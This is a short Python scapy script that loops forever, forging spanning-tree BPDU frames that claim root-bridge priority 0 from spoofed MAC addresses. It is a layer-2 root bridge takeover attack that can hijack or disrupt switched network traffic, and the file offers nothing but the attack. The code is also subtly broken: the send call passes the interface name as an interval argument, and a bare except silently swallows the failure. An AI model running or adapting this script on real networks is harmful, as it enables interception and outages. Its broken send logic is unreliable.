import scapy.all as scapy
import time



def traffic_sniffer(ifaces) :
    
    scapy.sniff(iface="eth0",store=False,prn=packets_shower)
    
    
    

def packets_shower(packet) : 
    # my_mac = "aa:aa:aa:aa:aa:aa ,"aa:bb:cc:00:01:00""
    my_ac_mac = "aa:aa:aa:aa:aa:aa"
    macs = ["aa:aa:aa:aa:aa:aa","aa:bb:cc:00:04:00"]
    for my_mac in macs : 
        try : 
            print(my_mac)
            new_packet = scapy.Ether(dst="01:80:c2:00:00:00",src=my_mac) / scapy.LLC() / scapy.STP(bpduflags=1,rootid=0,rootmac=my_mac,bridgeid=0,bridgemac=my_mac)
            new_packet.show()
            scapy.sendp(new_packet,inter="eth0")
            
        except :
            print("go on")
            time.sleep(1)


# traffic_sniffer("eth0")
while True :
    packets_shower("hello")
    time.sleep(1)

